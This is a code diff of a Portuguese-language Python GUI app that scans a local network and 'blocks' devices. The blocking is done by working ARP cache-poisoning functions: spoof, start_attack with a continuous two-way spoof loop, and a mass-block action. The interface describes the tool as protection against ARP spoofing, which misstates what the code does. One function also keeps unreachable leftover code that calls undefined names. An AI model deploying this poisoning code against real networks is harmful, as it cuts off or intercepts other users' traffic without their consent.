@@ -3,70 +3,327 @@ import asyncio
 import socket
 import threading
 import time
-from scapy.all import ARP, Ether, srp, send
+import subprocess
+import json
+import os
+import ipaddress
+import itertools
+import re
 
-# ==============================================================================
-# Backend: Funções de rede (mantidas do seu código original)
-# ==============================================================================
+
+# Dependências de rede
+import ifaddr
+from scapy.all import ARP, Ether, srp, send, conf
+
+# =====================================================================
+# Configurações e cache global
+# =====================================================================
+conf.verb = 0  # Menos ruído do Scapy
+VENDOR_CACHE_FILE = "mac_vendor_cache.json"
+IEEE_OUI_URL = "https://standards-oui.ieee.org/oui/oui.txt"
+
+CURRENT_IFACE = None
+CURRENT_SUBNET = None  # ipaddress.IPv4Network
+NMAP_BIN = None
+VENDOR_CACHE = {}
+
+# =====================================================================
+# Utilidades de rede e detecção de ambiente
+# =====================================================================
+
+def detect_active_interface_and_subnet():
+    """Descobre interface ativa e sub-rede usando ifaddr.
+    - Interface: a que contém o IP local obtido via rota (UDP 8.8.8.8)
+    - Sub-rede: derivada do prefixo do endereço
+    - Gateway: heurística .1 do segmento (mantém compatibilidade)
+    """
+    try:
+        import ipaddress
+        local_ip = get_local_ip()
+        chosen_adapter = None
+        chosen_ip = None
+        prefix = None
+
+        for adapter in ifaddr.get_adapters():
+            for ip in adapter.ips:
+                # Ignora IPv6 (em ifaddr, IPv6 pode vir como tupla)
+                if isinstance(ip.ip, tuple):
+                    continue
+                if ip.ip == local_ip:
+                    chosen_adapter = adapter
+                    chosen_ip = ip.ip
+                    prefix = ip.network_prefix
+                    break
+            if chosen_adapter:
+                break
+
+        if chosen_adapter and chosen_ip and prefix is not None:
+            subnet = ipaddress.ip_network(f"{chosen_ip}/{prefix}", strict=False)
+            gw_ip = ".".join(chosen_ip.split(".")[:-1]) + ".1"
+            iface_name = getattr(chosen_adapter, "nice_name", getattr(chosen_adapter, "name", None))
+            return iface_name, gw_ip, subnet
+
+        # Fallback: usa apenas o IP local e assume /24
+        gw_ip = ".".join(local_ip.split("." )[:-1]) + ".1"
+        try:
+            subnet = ipaddress.ip_network(".".join(local_ip.split(".")[:-1]) + ".0/24", strict=False)
+        except Exception:
+            subnet = None
+        # tentar pegar nome da interface pelo ifaddr
+        iface_name = None
+        for adapter in ifaddr.get_adapters():
+            for ip in adapter.ips:
+                if not isinstance(ip.ip, tuple) and ip.ip == local_ip:
+                    iface_name = getattr(adapter, "nice_name", getattr(adapter, "name", None))
+                    break
+            if iface_name:
+                break
+        return iface_name, gw_ip, subnet
+    except Exception:
+        return None, None, None
+
+        iface = default_gateway_info[1]
+        gw_ip = default_gateway_info[0]
+
+        addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
+        for a in addrs:
+            ip = a.get("addr")
+            netmask = a.get("netmask")
+            if ip and netmask:
+                try:
+                    subnet = ipaddress.ip_network(f"{ip}/{netmask}", strict=False)
+                    return iface, gw_ip, subnet
+                except Exception:
+                    pass
+        return iface, gw_ip, None
+    except Exception:
+        return None, None, None
+
+
+def get_local_ip():
+    """Obtém IP local preferindo rota real (UDP)."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+    except Exception:
+        ip = "127.0.0.1"
+    finally:
+        s.close()
+    return ip
+
+
+def resolve_nmap_binary():
+    """Resolve o binário do nmap presente no PATH (Windows/Linux)."""
+    candidates = ["nmap"]
+    for c in candidates:
+        try:
+            r = subprocess.run([c, "-V"], capture_output=True, text=True, timeout=3)
+            if r.returncode == 0 or r.stdout or r.stderr:
+                return c
+        except Exception:
+            continue
+    return None
+
+# =====================================================================
+# Vendor cache (OUI -> fabricante)
+# =====================================================================
+
+def load_vendor_cache():
+    global VENDOR_CACHE
+    if os.path.exists(VENDOR_CACHE_FILE):
+        try:
+            with open(VENDOR_CACHE_FILE, "r", encoding="utf-8") as f:
+                VENDOR_CACHE = json.load(f)
+        except Exception:
+            VENDOR_CACHE = {}
+    else:
+        VENDOR_CACHE = {}
+
+
+def save_vendor_cache():
+    try:
+        with open(VENDOR_CACHE_FILE, "w", encoding="utf-8") as f:
+            json.dump(VENDOR_CACHE, f, indent=2, ensure_ascii=False)
+    except Exception:
+        pass
+
+
+def update_vendor_cache_from_ieee() -> int:
+    """Baixa a base OUI da IEEE e atualiza o cache. Retorna quantas entradas novas foram lidas."""
+    import requests
+    try:
+        resp = requests.get(IEEE_OUI_URL, timeout=30)
+        resp.raise_for_status()
+        lines = resp.text.splitlines()
+        added = 0
+        for line in lines:
+            if "(hex)" in line:
+                parts = line.split("(hex)")
+                if len(parts) > 1:
+                    oui_mac = parts[0].strip().replace("-", ":").upper()  # AA:BB:CC
+                    company = parts[1].strip()
+                    if oui_mac and company:
+                        if VENDOR_CACHE.get(oui_mac) != company:
+                            VENDOR_CACHE[oui_mac] = company
+                            added += 1
+        save_vendor_cache()
+        return added
+    except Exception:
+        return 0
+
+
+def vendor_from_cache_only(mac: str) -> str:
+    if not mac or len(mac) < 8:
+        return "Desconhecido"
+    oui = ":".join(mac.replace("-", ":").upper().split(":")[:3])
+    return VENDOR_CACHE.get(oui, "Desconhecido")
+
+# =====================================================================
+# Funções de varredura (mantendo nomes compatíveis com seu código)
+# =====================================================================
+
+def robust_get_mac(ip: str, iface: str, retries=5, initial_timeout=1.0):
+    """Resolve MAC por ARP com múltiplas tentativas e timeout incremental."""
+    if not iface:
+        return None
+    for i in range(retries):
+        try:
+            answered, _ = srp(
+                Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
+                timeout=initial_timeout + i*0.3,
+                retry=1,
+                verbose=0,
+                iface=iface,
+            )
+            for _, r in answered:
+                return r[Ether].src
+        except Exception:
+            pass
+        time.sleep(0.05)
+    return None
+
 
 def get_gateway_ip():
-    """Tenta obter o IP do gateway da rede local."""
+    """Mantém a assinatura: usa heurística baseada no IP local (sem netifaces)."""
     try:
-        # Usando uma rota padrão para encontrar o gateway
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         local_ip = s.getsockname()[0]
         s.close()
         return ".".join(local_ip.split('.')[:-1]) + ".1"
     except Exception:
-        # Fallback se o método acima falhar
         try:
             local_ip = socket.gethostbyname(socket.gethostname())
             return ".".join(local_ip.split('.')[:-1]) + ".1"
         except Exception:
-            return "192.168.1.1"  # Último recurso
+            return "192.168.1.1"
+
 
 def get_mac(ip):
-    """Obtém o endereço MAC de um determinado endereço IP."""
-    answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=3, verbose=False)
-    for _, r in answered:
-        return r[Ether].src
-    return None
+    """Mantém o nome/assinatura do seu código. Usa a interface atual se existir."""
+    iface = CURRENT_IFACE
+    mac = robust_get_mac(ip, iface, retries=5, initial_timeout=0.8)
+    return mac
 
-def scan_network(network):
-    """Escaneia a rede para encontrar dispositivos conectados."""
+
+def scan_network_base(network_range, iface, nmap_bin=None):
+    """Descoberta rápida: ARP sweep (Scapy) + Nmap -sn (quando disponível). Retorna [{'ip','mac'}]."""
     devices = []
-    arp_request = ARP(pdst=network)
-    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+    # 1) ARP sweep
+    try:
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(network_range))
+        result = srp(pkt, timeout=3, iface=iface, verbose=0)[0]
+        for _, rec in result:
+            devices.append({"ip": rec.psrc, "mac": rec.hwsrc})
+    except Exception:
+        pass
 
-    for element in answered_list:
-        device = {'ip': element[1].psrc, 'mac': element[1].hwsrc, 'status': 'Conectado'}
-        devices.append(device)
+    # 2) Complemento Nmap -sn
+    if nmap_bin:
+        try:
+            r = subprocess.run([nmap_bin, "-sn", "-T4", str(network_range)],
+                               capture_output=True, text=True, timeout=60, check=True)
+            lines = r.stdout.splitlines()
+            current_ip = None
+            for line in lines:
+                if "Nmap scan report for" in line:
+                    try:
+                        current_ip = line.split("for ")[1].split(" ")[0].strip("()") if "(" in line else line.split("for ")[1].strip()
+                    except Exception:
+                        current_ip = None
+                elif "MAC Address:" in line and current_ip:
+                    mac = line.split("MAC Address: ")[1].split(" ")[0]
+                    found = False
+                    for d in devices:
+                        if d["ip"] == current_ip:
+                            if not d.get("mac") or d["mac"] in ("", "Desconhecido"):
+                                d["mac"] = mac
+                            found = True
+                            break
+                    if not found:
+                        devices.append({"ip": current_ip, "mac": mac})
+                    current_ip = None
+                elif current_ip and not any(d["ip"] == current_ip for d in devices):
+                    devices.append({"ip": current_ip, "mac": "Desconhecido"})
+                    current_ip = None
+        except subprocess.TimeoutExpired:
+            pass
+        except Exception:
+            pass
+
     return devices
 
+
+def scan_network(network: str):
+    """Mantém o nome/assinatura original do seu código: escaneia a rede e retorna devices."""
+    try:
+        iface = CURRENT_IFACE
+        nmap_bin = NMAP_BIN
+        # Converte string CIDR em objeto IPv4Network se possível
+        try:
+            net = ipaddress.ip_network(network, strict=False)
+        except Exception:
+            # fallback para /24
+            base = network.split("/")[0].rsplit(".", 1)[0] + ".0/24"
+            net = ipaddress.ip_network(base, strict=False)
+        return scan_network_base(net, iface, nmap_bin)
+    except Exception:
+        return []
+
+
 def spoof(target_ip, spoof_ip):
-    """Envia um pacote ARP para envenenar o cache ARP do alvo."""
+    """Mantém a assinatura do seu código. Envia ARP Reply para envenenar o alvo."""
     target_mac = get_mac(target_ip)
     if target_mac:
-        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-        send(packet, verbose=False)
+        try:
+            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+            send(packet, verbose=False, iface=CURRENT_IFACE)
+        except Exception:
+            pass
+
 
 def restore(target_ip, source_ip):
-    """Restaura o cache ARP do alvo para o estado original."""
+    """Mantém a assinatura do seu código. Restaura o ARP com MACs reais."""
     target_mac = get_mac(target_ip)
     source_mac = get_mac(source_ip)
     if target_mac and source_mac:
-        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
-        send(packet, count=4, verbose=False)
+        try:
+            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
+            send(packet, count=4, verbose=False, iface=CURRENT_IFACE)
+        except Exception:
+            pass
+
 
 def start_attack(target_ip, gateway_ip, attacking_state):
-    """Inicia o ataque de ARP spoofing em uma thread separada."""
+    """Mantém a assinatura/comportamento: loop em thread enviando spoof bilateral."""
     if target_ip == gateway_ip:
         return
 
     def attack_loop():
+        # Pequena fase inicial para obter MACs e validar conectividade
+        _ = get_mac(target_ip)
+        _ = get_mac(gateway_ip)
         while attacking_state.get(target_ip):
             spoof(target_ip, gateway_ip)
             spoof(gateway_ip, target_ip)
@@ -76,20 +333,30 @@ def start_attack(target_ip, gateway_ip, attacking_state):
     thread = threading.Thread(target=attack_loop, daemon=True)
     thread.start()
 
+
 def stop_attack(target_ip, gateway_ip, attacking_state):
-    """Para o ataque de ARP spoofing e restaura a rede."""
+    """Mantém a assinatura: para loop e restaura ARP dos dois lados."""
     if target_ip in attacking_state:
         attacking_state[target_ip] = False
-        time.sleep(0.1)  # Dá tempo para a thread parar
+        time.sleep(0.1)
         restore(target_ip, gateway_ip)
         restore(gateway_ip, target_ip)
 
-# ==============================================================================
-# Frontend: Aplicação Flet com o novo design
-# ==============================================================================
+
+def get_hostname(ip: str) -> str:
+    try:
+        return socket.gethostbyaddr(ip)[0]
+    except Exception:
+        return "Desconhecido"
+
+# =====================================================================
+# Frontend: App Flet (mantendo Bloquear/Liberar igual ao seu modelo)
+# =====================================================================
 
 class NetworkControlApp:
     def __init__(self, page: ft.Page):
+        global CURRENT_IFACE, CURRENT_SUBNET, NMAP_BIN
+
         self.page = page
         self.page.title = "Painel de Controle da Rede"
         self.page.theme_mode = ft.ThemeMode.DARK
@@ -98,29 +365,38 @@ class NetworkControlApp:
         self.page.fonts = {"Inter": "https://rsms.me/inter/font-files/Inter-Regular.otf?v=3.19"}
         self.page.theme = ft.Theme(font_family="Inter")
         self.page.window_min_width = 600
-        self.page.window_min_height = 700
+        self.page.window_min_height = 720
 
-        # --- Estado da Aplicação ---
-        self.attacking = {}
-        self.all_devices = []
-        self.local_ip = self.get_local_ip()
-        self.gateway_ip = get_gateway_ip()
+        # Estado
+        self.attacking = {}              # ip -> bool
+        self.all_devices = []            # lista de dicts de dispositivos
+        self.device_index = {}           # ip -> dict (acesso/atualização rápida)
         self.stop_scan_requested = False
-        self.scanning = False  # <- novo estado de escaneamento
+        self.scanning = False
 
-        # --- Controles da UI ---
+        # Descoberta de interface/sub-rede/gateway e Nmap
+        iface, gw_ip, subnet = detect_active_interface_and_subnet()
+        CURRENT_IFACE = iface
+        CURRENT_SUBNET = subnet
+        NMAP_BIN = resolve_nmap_binary()
+
+        self.local_ip = get_local_ip()
+        self.gateway_ip = gw_ip or get_gateway_ip()
+
+        load_vendor_cache()
+
+        # Controles de UI
         self.search_field = ft.TextField(
-            hint_text="Buscar por IP, MAC ou nome...",
+            hint_text="Buscar por IP, MAC, nome ou fabricante...",
             prefix_icon=ft.Icons.SEARCH,
-            border_color="#374151",  # border-gray-700
-            focused_border_color="#3b82f6",  # ring-blue-500
+            border_color="#374151",
+            focused_border_color="#3b82f6",
             border_radius=8,
             on_change=self.filter_devices,
             height=40,
             content_padding=ft.padding.symmetric(horizontal=12),
         )
 
-        # Botão ÚNICO de alternância (iniciar/parar scan)
         self.scan_toggle_button = ft.ElevatedButton(
             content=ft.Row(
                 [
@@ -130,158 +406,151 @@ class NetworkControlApp:
                 alignment=ft.MainAxisAlignment.CENTER,
             ),
             on_click=self.toggle_scan,
-            height=40,  # <-- força altura igual ao TextField
+            height=40,
             style=ft.ButtonStyle(
                 bgcolor="#2563eb",
                 color="white",
                 shape=ft.RoundedRectangleBorder(radius=8),
-                padding=ft.padding.symmetric(horizontal=16),  # padding só horizontal
-            )
+                padding=ft.padding.symmetric(horizontal=16),
+            ),
         )
 
+        self.block_all_button = self.create_mass_action_button(
+            "Bloquear Todos", ft.Icons.SHIELD_OUTLINED, "#f87171", self.mass_block
+        )
+        self.unblock_all_button = self.create_mass_action_button(
+            "Liberar Todos", ft.Icons.SHIELD, "#4ade80", self.mass_unblock
+        )
 
-        self.block_all_button = self.create_mass_action_button("Bloquear Todos", ft.Icons.SHIELD_OUTLINED, "#f87171", self.mass_block)
-        self.unblock_all_button = self.create_mass_action_button("Liberar Todos", ft.Icons.SHIELD, "#4ade80", self.mass_unblock)
+        self.update_oui_button = ft.TextButton(
+            content=ft.Row([
+                ft.Icon(ft.Icons.DOWNLOAD, size=16, color="#60a5fa"),
+                ft.Text("Atualizar base OUI (IEEE)", size=12, color="#60a5fa"),
+            ]),
+            on_click=self.update_oui_cache,
+        )
+
+        self.scan_progress = ft.ProgressBar(value=0, height=6, bgcolor="#1f2937")
+        self.scan_status = ft.Text("Pronto", size=12, color=ft.Colors.GREY_400)
 
         self.devices_list_view = ft.ListView(expand=True, spacing=4, padding=ft.padding.symmetric(horizontal=8))
 
         self.build_layout()
-        # Escaneamento inicial opcional
         self.page.run_task(self.initial_scan)
 
-    def get_local_ip(self):
-        """Obtém o IP local da máquina."""
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        try:
-            s.connect(('10.255.255.255', 1))
-            IP = s.getsockname()[0]
-        except Exception:
-            IP = '127.0.0.1'
-        finally:
-            s.close()
-        return IP
-
+    # ---------------- UI helpers ----------------
     def create_mass_action_button(self, text, icon, color, on_click):
-        """Cria um botão de ação em massa (Bloquear/Liberar Todos)."""
         return ft.TextButton(
             content=ft.Row([ft.Icon(icon, size=16, color=color), ft.Text(text, size=12, color=color)]),
             on_click=on_click,
-            style=ft.ButtonStyle(overlay_color=ft.Colors.with_opacity(0.1, color))
+            style=ft.ButtonStyle(overlay_color=ft.Colors.with_opacity(0.1, color)),
         )
 
     def build_layout(self):
-        """Constrói o layout principal da página."""
-        main_container = ft.Container(
-            expand=True,
-            content=ft.Column(
-                [
-                    # --- Cabeçalho ---
-                    ft.Container(
-                        content=ft.Column([
-                            ft.Text("Painel de Controle da Rede", size=28, weight=ft.FontWeight.BOLD),
-                            ft.Text("Gerencie dispositivos e proteja sua rede contra ARP Spoofing.", color=ft.Colors.GREY_400),
-                        ]),
-                        padding=ft.padding.only(top=20, left=20, right=20, bottom=10)
-                    ),
-
-                    # --- Ações Principais (Busca e Scan) ---
-                    ft.Container(
-                        content=ft.ResponsiveRow(
-                            [
-                                ft.Container(self.search_field, col={"xs": 12, "sm": 7, "md": 6, "lg": 6}),
-                                ft.Container(self.scan_toggle_button, col={"xs": 12, "sm": 5, "md": 3, "lg": 2}),
-
-                            ],
-                            vertical_alignment=ft.CrossAxisAlignment.CENTER,
-                            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
-                        ),
-                        padding=ft.padding.symmetric(horizontal=20, vertical=10)
-                    ),
-
-
-                    # --- Card da Lista de Dispositivos ---
-                    ft.Container(
-                        expand=True,
-                        content=ft.Column([
-                            ft.Container(
-                                content=ft.Row([
-                                    ft.Text("Dispositivos Conectados", weight=ft.FontWeight.W_600, size=16),
-                                    ft.Row([self.block_all_button, self.unblock_all_button])
-                                ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
-                                padding=ft.padding.only(left=16, right=8, top=12, bottom=8),
-                                border=ft.border.only(bottom=ft.border.BorderSide(1, "#374151"))
-                            ),
-                            self.devices_list_view,
-                        ]),
-                        bgcolor="#1f2937",  # bg-gray-800
-                        border=ft.border.all(1, "#374151"),  # border-gray-700
-                        border_radius=12,
-                        margin=ft.margin.all(20),
-                        shadow=ft.BoxShadow(
-                            spread_radius=1,
-                            blur_radius=15,
-                            color=ft.Colors.with_opacity(0.2, "black"),
-                            offset=ft.Offset(0, 5),
-                        )
-                    )
-                ]
-            )
+        header = ft.Container(
+            content=ft.Column([
+                ft.Text("Painel de Controle da Rede", size=28, weight=ft.FontWeight.BOLD),
+                ft.Text("Gerencie dispositivos e proteja sua rede contra ARP Spoofing.", color=ft.Colors.GREY_400),
+            ]),
+            padding=ft.padding.only(top=20, left=20, right=20, bottom=10),
         )
-        self.page.add(main_container)
+
+        actions = ft.Container(
+            content=ft.ResponsiveRow(
+                [
+                    ft.Container(self.search_field, col={"xs": 12, "sm": 6, "md": 6, "lg": 6}),
+                    ft.Container(self.scan_toggle_button, col={"xs": 12, "sm": 3, "md": 2, "lg": 2}),
+                    ft.Container(self.update_oui_button, col={"xs": 12, "sm": 3, "md": 2, "lg": 2}),
+                ],
+                vertical_alignment=ft.CrossAxisAlignment.CENTER,
+                alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
+            ),
+            padding=ft.padding.symmetric(horizontal=20, vertical=10),
+        )
+
+        devices_card = ft.Container(
+            expand=True,
+            content=ft.Column([
+                ft.Container(
+                    content=ft.Row([
+                        ft.Text("Dispositivos Conectados", weight=ft.FontWeight.W_600, size=16),
+                        ft.Row([self.block_all_button, self.unblock_all_button]),
+                    ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
+                    padding=ft.padding.only(left=16, right=8, top=12, bottom=8),
+                    border=ft.border.only(bottom=ft.border.BorderSide(1, "#374151")),
+                ),
+                ft.Container(self.scan_progress, padding=ft.padding.symmetric(horizontal=16)),
+                ft.Container(self.scan_status, padding=ft.padding.only(left=16, right=16, bottom=8)),
+                self.devices_list_view,
+            ]),
+            bgcolor="#1f2937",  # bg-gray-800
+            border=ft.border.all(1, "#374151"),  # border-gray-700
+            border_radius=12,
+            margin=ft.margin.all(20),
+            shadow=ft.BoxShadow(
+                spread_radius=1,
+                blur_radius=15,
+                color=ft.Colors.with_opacity(0.2, "black"),
+                offset=ft.Offset(0, 5),
+            ),
+        )
+
+        self.page.add(ft.Container(expand=True, content=ft.Column([header, actions, devices_card])))
 
     def create_device_card(self, device):
-        """Cria um card para um dispositivo individual."""
         ip = device['ip']
         mac = device['mac']
         status = device['status']
+        hostname = device.get('hostname', 'Desconhecido')
+        vendor = device.get('vendor', 'Desconhecido')
 
-        # Determina o ícone e a cor com base no status/tipo
+        # Ícone por status/tipo
         if status == 'Gateway Padrão':
             icon_name = ft.Icons.ROUTER_OUTLINED
-            icon_color = "#60a5fa"  # text-blue-400
-            icon_bg = "#1e40af"  # bg-blue-500/20
+            icon_color = "#60a5fa"
+            icon_bg = "#1e40af"
         elif status == 'Este Dispositivo':
             icon_name = ft.Icons.LAPTOP_MAC_OUTLINED
-            icon_color = "#a78bfa"  # text-indigo-400
-            icon_bg = "#4338ca"  # bg-indigo-500/20
+            icon_color = "#a78bfa"
+            icon_bg = "#4338ca"
         elif status == 'Bloqueado':
             icon_name = ft.Icons.NO_CELL_OUTLINED
-            icon_color = "#f87171"  # text-red-400
-            icon_bg = "#991b1b"  # bg-red-500/20
+            icon_color = "#f87171"
+            icon_bg = "#991b1b"
         else:  # Conectado
-            # Tenta adivinhar o tipo de dispositivo pelo MAC (simplificado)
-            if any(vendor in mac.lower() for vendor in ["00:03:93", "00:10:db"]):  # Apple
-                icon_name = ft.Icons.PHONE_IPHONE
-            elif any(vendor in mac.lower() for vendor in ["3c:5a:b4", "f8:e0:79"]):  # Google
-                icon_name = ft.Icons.PHONE_ANDROID
-            else:
-                icon_name = ft.Icons.DEVICE_UNKNOWN
-            icon_color = "#4ade80"  # text-green-400
-            icon_bg = "#166534"  # bg-green-500/20
+            icon_name = ft.Icons.DEVICE_UNKNOWN
+            icon_color = "#4ade80"
+            icon_bg = "#166534"
 
         device_icon = ft.Container(
             content=ft.Icon(name=icon_name, color=icon_color),
             width=48, height=48,
             bgcolor=icon_bg,
             border_radius=24,
-            alignment=ft.alignment.center
+            alignment=ft.alignment.center,
         )
 
         # Badge de Status
         if status == 'Conectado':
-            status_badge = ft.Row([ft.Container(width=8, height=8, bgcolor="#4ade80", border_radius=4), ft.Text("Conectado", color="#4ade80", size=12)])
+            status_badge = ft.Row([
+                ft.Container(width=8, height=8, bgcolor="#4ade80", border_radius=4),
+                ft.Text("Conectado", color="#4ade80", size=12),
+            ])
         elif status == 'Bloqueado':
-            status_badge = ft.Row([ft.Container(width=8, height=8, bgcolor="#f87171", border_radius=4), ft.Text("Bloqueado", color="#f87171", size=12)])
+            status_badge = ft.Row([
+                ft.Container(width=8, height=8, bgcolor="#f87171", border_radius=4),
+                ft.Text("Bloqueado", color="#f87171", size=12),
+            ])
         else:
             status_badge = ft.Text(status, color="#a78bfa", size=12, weight=ft.FontWeight.W_600)
 
-        # Botão de Ação
+        # Botão de ação
         action_button = ft.Container()
         if status not in ['Gateway Padrão', 'Este Dispositivo']:
             is_blocked = status == 'Bloqueado'
             btn_text = "Liberar" if is_blocked else "Bloquear"
             btn_icon = ft.Icons.CHECK_CIRCLE_OUTLINE if is_blocked else ft.Icons.BLOCK
-            btn_bgcolor = "#16a34a" if is_blocked else "#4b5563"  # bg-green-600 : bg-gray-600
+            btn_bgcolor = "#16a34a" if is_blocked else "#4b5563"
 
             action_button = ft.ElevatedButton(
                 text=btn_text,
@@ -291,30 +560,33 @@ class NetworkControlApp:
                 style=ft.ButtonStyle(
                     bgcolor=btn_bgcolor,
                     color="white",
-                    shape=ft.RoundedRectangleBorder(radius=8)
-                )
+                    shape=ft.RoundedRectangleBorder(radius=8),
+                ),
             )
 
+        left = ft.Container(
+            content=ft.Row([
+                device_icon,
+                ft.Column([
+                    ft.Text(ip, weight=ft.FontWeight.BOLD, size=15),
+                    ft.Text(hostname, color=ft.Colors.GREY_400, size=12),
+                    ft.Text(mac, color=ft.Colors.GREY_500, size=12, font_family="monospace"),
+                    ft.Text(vendor, color=ft.Colors.GREY_500, size=12),
+                ], spacing=2),
+            ]),
+            col={"xs": 12, "sm": 7},
+        )
+
+        right = ft.Container(
+            content=ft.Row([status_badge, action_button], alignment=ft.MainAxisAlignment.END, spacing=12),
+            alignment=ft.alignment.center_right,
+            col={"xs": 12, "sm": 5},
+        )
+
         card_content = ft.ResponsiveRow(
-            [
-                ft.Container(
-                    content=ft.Row([
-                        device_icon,
-                        ft.Column([
-                            ft.Text(ip, weight=ft.FontWeight.BOLD, size=15),
-                            ft.Text(mac, color=ft.Colors.GREY_500, size=12, font_family="monospace"),
-                        ], spacing=2),
-                    ]),
-                    col={"xs": 12, "sm": 6}
-                ),
-                ft.Container(
-                    content=ft.Row([status_badge, action_button], alignment=ft.MainAxisAlignment.END, spacing=12),
-                    alignment=ft.alignment.center_right,
-                    col={"xs": 12, "sm": 6}
-                ),
-            ],
+            [left, right],
             vertical_alignment=ft.CrossAxisAlignment.CENTER,
-            alignment=ft.MainAxisAlignment.SPACE_BETWEEN
+            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
         )
 
         return ft.Container(
@@ -323,97 +595,245 @@ class NetworkControlApp:
             border_radius=8,
             ink=True,
             bgcolor=ft.Colors.with_opacity(0.02, "white") if status != 'Este Dispositivo' else ft.Colors.with_opacity(0.1, "#a78bfa"),
-            data=device  # Armazena os dados do dispositivo no controle
+            data=device,
         )
 
     def update_device_list(self, devices_to_display):
-        """Atualiza a lista de dispositivos na UI."""
-        # Ordena os dispositivos
+        # Ordenação: gateway -> local -> demais por IP
         def sort_key(d):
             ip = d['ip']
             if ip == self.gateway_ip:
                 return (0,)
             if ip == self.local_ip:
                 return (1,)
-            return (2, tuple(int(p) for p in ip.split('.')))
+            try:
+                return (2, tuple(int(p) for p in ip.split('.')))
+            except Exception:
+                return (2, (999, 999, 999, 999))
 
         sorted_devices = sorted(devices_to_display, key=sort_key)
-
         self.devices_list_view.controls.clear()
         for device in sorted_devices:
             self.devices_list_view.controls.append(self.create_device_card(device))
         self.page.update()
 
+    # ---------- Helpers de atualização incremental ----------
+    def add_or_update_device(self, ip: str, mac: str | None = None,
+                             hostname: str | None = None, vendor: str | None = None):
+        status = (
+            'Gateway Padrão' if ip == self.gateway_ip else
+            ('Este Dispositivo' if ip == self.local_ip else ('Bloqueado' if self.attacking.get(ip) else 'Conectado'))
+        )
+
+        if ip in self.device_index:
+            d = self.device_index[ip]
+            if mac and (d['mac'] in ('Desconhecido', '??:??:??:??:??:??') or d['mac'] != mac):
+                d['mac'] = mac
+                d['vendor'] = vendor or vendor_from_cache_only(mac)
+            if hostname and (d['hostname'] == 'Desconhecido'):
+                d['hostname'] = hostname
+            d['status'] = status
+        else:
+            d = {
+                'ip': ip,
+                'mac': mac or 'Desconhecido',
+                'hostname': hostname or 'Desconhecido',
+                'vendor': vendor or (vendor_from_cache_only(mac) if mac else 'Desconhecido'),
+                'status': status,
+            }
+            self.all_devices.append(d)
+            self.device_index[ip] = d
+
+        # Reaplica filtro e re-renderiza
+        self.filter_devices(None)
+
+    def _arp_chunk_scan(self, ips):
+        """Executa ARP para um pequeno lote de IPs e retorna [(ip, mac)]."""
+        try:
+            packets = [Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip) for ip in ips]
+            answered, _ = srp(packets, timeout=1.5, iface=CURRENT_IFACE, verbose=0)
+            return [(r.psrc, r.hwsrc) for _, r in answered]
+        except Exception:
+            return []
+
+    async def _nmap_stream_supplement(self, network_cidr: str):
+        """Roda nmap -sn em modo streaming, enriquecendo MAC/vendor conforme linhas chegam."""
+        if not NMAP_BIN:
+            return
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                NMAP_BIN, "-sn", "-T4", network_cidr,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            current_ip = None
+
+            while True:
+                if self.stop_scan_requested:
+                    try:
+                        proc.kill()
+                    except Exception:
+                        pass
+                    break
+
+                line = await proc.stdout.readline()
+                if not line:
+                    break
+                s = line.decode(errors="ignore").strip()
+
+                if "Nmap scan report for" in s:
+                    m = re.search(r"\((\d+\.\d+\.\d+\.\d+)\)", s)
+                    if m:
+                        current_ip = m.group(1)
+                    else:
+                        # pode vir apenas IP no final
+                        try:
+                            current_ip = s.split("for", 1)[1].strip().split()[-1]
+                        except Exception:
+                            current_ip = None
+                    if current_ip:
+                        self.add_or_update_device(current_ip)
+                elif "MAC Address:" in s and current_ip:
+                    try:
+                        mac = s.split("MAC Address: ")[1].split()[0]
+                        self.add_or_update_device(current_ip, mac=mac)
+                    except Exception:
+                        pass
+                    finally:
+                        current_ip = None
+
+                self.scan_status.value = f"Complementando com Nmap… {len(self.all_devices)} dispositivos"
+                self.page.update()
+
+            try:
+                await proc.wait()
+            except Exception:
+                pass
+        except Exception:
+            # Silencia erros do nmap (não crítico)
+            return
+
+    # ---------------- Ações ----------------
     async def toggle_scan(self, e):
-        """Alterna entre iniciar e parar o escaneamento."""
         if not self.scanning:
-            # Iniciar scan
+            # Iniciar
             self.scanning = True
             self.stop_scan_requested = False
-            # Muda visual do botão para "Parar"
             self.scan_toggle_button.content.controls[0].name = ft.Icons.STOP_CIRCLE
             self.scan_toggle_button.content.controls[1].value = "Parar Scan"
-            self.scan_toggle_button.style.bgcolor = "#dc2626"  # Vermelho
+            self.scan_toggle_button.style.bgcolor = "#dc2626"
+            self.scan_status.value = "Escaneando..."
+            self.scan_progress.value = None  # indeterminado durante preparação
             self.page.update()
 
-            # Executa o scan
             await self.run_scan_task()
 
-            # Ao terminar (naturalmente ou por stop), voltar ao estado pronto
+            # Finalizar
             self.scanning = False
             self.scan_toggle_button.content.controls[0].name = ft.Icons.WIFI
             self.scan_toggle_button.content.controls[1].value = "Escanear Rede"
-            self.scan_toggle_button.style.bgcolor = "#2563eb"  # Azul
+            self.scan_toggle_button.style.bgcolor = "#2563eb"
